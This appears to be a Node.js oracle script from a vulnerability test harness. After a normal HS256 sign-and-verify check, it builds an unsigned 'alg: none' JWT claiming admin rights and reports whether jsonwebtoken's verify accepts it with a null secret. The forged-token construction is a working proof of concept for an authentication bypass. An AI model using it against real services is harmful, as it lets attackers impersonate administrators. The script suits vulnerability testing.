const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function b64urlJson(obj) {
  return Buffer.from(JSON.stringify(obj)).toString('base64url');
}

try {
  // Benign public operation: normal HS256 sign/verify must succeed first.
  const benignSecret = 'oracle-benign-secret';
  const benignPayload = { sub: 'user123', scope: 'read' };
  const benignToken = jwt.sign(benignPayload, benignSecret, { algorithm: 'HS256' });
  const benignOut = jwt.verify(benignToken, benignSecret);

  if (!benignOut || benignOut.sub !== 'user123' || benignOut.scope !== 'read') {
    throw new Error('benign verify returned unexpected payload');
  }

  operation_completed = true;

  // Malicious input for CVE-style "none" algorithm acceptance bypass.
  // Construct unsigned token manually (alg=none, empty signature).
  const header = { alg: 'none', typ: 'JWT' };
  const payload = { sub: 'attacker', admin: true, iat: 1 };
  const forged = b64urlJson(header) + '.' + b64urlJson(payload) + '.';

  try {
    // Vulnerable behavior: accepts unsigned token when falsy secret is provided.
    const out = jwt.verify(forged, null);
    if (out && out.sub === 'attacker' && out.admin === true) {
      exploit_succeeded = true;
      evidence = 'unsigned none-alg token accepted by verify(forged, null)';
    } else {
      exploit_succeeded = false;
      evidence = 'malicious verify returned payload but not expected attacker claims';
    }
  } catch (err) {
    exploit_succeeded = false;
    evidence = 'malicious verify rejected: ' + (err && err.message ? err.message : String(err));
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (err && err.message ? err.message : String(err));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));